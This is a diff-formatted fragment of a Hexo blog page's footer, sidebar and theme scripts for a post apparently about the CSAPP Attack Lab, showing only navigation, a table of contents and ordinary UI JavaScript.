+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Assembly/" rel="tag">#Assembly</a>
+          
+            <a href="/tags/CSAPP/" rel="tag">#CSAPP</a>
+          
+            <a href="/tags/Lab/" rel="tag">#Lab</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/05/12/CSAPP-Lab2-Bomb-Lab/" rel="next" title="CSAPP Lab2 - Bomb Lab">
+                <i class="fa fa-chevron-left"></i> CSAPP Lab2 - Bomb Lab
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/05/13/Mac/" rel="prev" title="">
+                 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="mp.jpg"
+               alt="Zhang Yi" />
+          <p class="site-author-name" itemprop="name">Zhang Yi</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">0</span>
+              <span class="site-state-item-name">categories</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">6</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator">
+            <i class="fa fa-angle-double-up"></i>
+          </div>
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Prerequisite"><span class="nav-number">1.</span> <span class="nav-text">Prerequisite</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Redirct"><span class="nav-number">1.1.</span> <span class="nav-text">Redirct</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb_u4E2D_uFF0C_u4E24_u79CD_u65B9_u5F0F_u8BBE_u7F6E_u53C2_u6570"><span class="nav-number">1.2.</span> <span class="nav-text">gdb中，两种方式设置参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#u7F16_u8BD1_u6B65_u9AA4_uFF08_u6BCF_u4E00_u6B65_u4EE5_u4E0A_u4E00_u6B65_u8F93_u51FA_u4E3A_u8F93_u5165_uFF09"><span class="nav-number">1.3.</span> <span class="nav-text">编译步骤（每一步以上一步输出为输入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#u5BF9_u5E94_u7684gcc_u3001objdump_u547D_u4EE4"><span class="nav-number">1.4.</span> <span class="nav-text">对应的gcc、objdump命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab_uFF1A"><span class="nav-number">2.</span> <span class="nav-text">Lab：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#u51C6_u5907"><span class="nav-number">2.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part_I_3A_Code_Injection_Attacks"><span class="nav-number">2.2.</span> <span class="nav-text">Part I: Code Injection Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level_1"><span class="nav-number">2.2.1.</span> <span class="nav-text">Level 1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab_Content"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">Lab Content</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solve"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">Solve</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level_2"><span class="nav-number">2.2.2.</span> <span class="nav-text">Level 2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab_Content-1"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">Lab Content</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solve-1"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">Solve</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level_3"><span class="nav-number">2.2.3.</span> <span class="nav-text">Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab_Content-2"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">Lab Content</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solve-2"><span class="nav-number">2.2.3.2.</span> <span class="nav-text">Solve</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part_II_3A_Return-Oriented_Programming"><span class="nav-number">2.3.</span> <span class="nav-text">Part II: Return-Oriented Programming</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level_2-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">Level 2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab_Content-3"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">Lab Content</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solve-3"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">Solve</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level_3-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab_Content-4"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">Lab Content</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solve-4"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">Solve</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator">
+            <i class="fa fa-angle-double-down"></i>
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-next-heart fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zhang Yi</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  
+
+
+  
+
+
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=0.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=0.5.0"></script>
+
+
+
+  
+  
+
+  
+  
+<script type="text/javascript" src="/js/src/scrollspy.js?v=0.5.0"></script>
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 1 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = NexT.utils.escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    NexT.motion.middleWares.sidebar = function () {
+      var $tocContent = $('.post-toc-content');
+
+      if (CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          NexT.utils.displaySidebar();
+        }
+      }
+    };
+  });
+</script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=0.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+
+  
+  
+
+
+</body>
+</html>
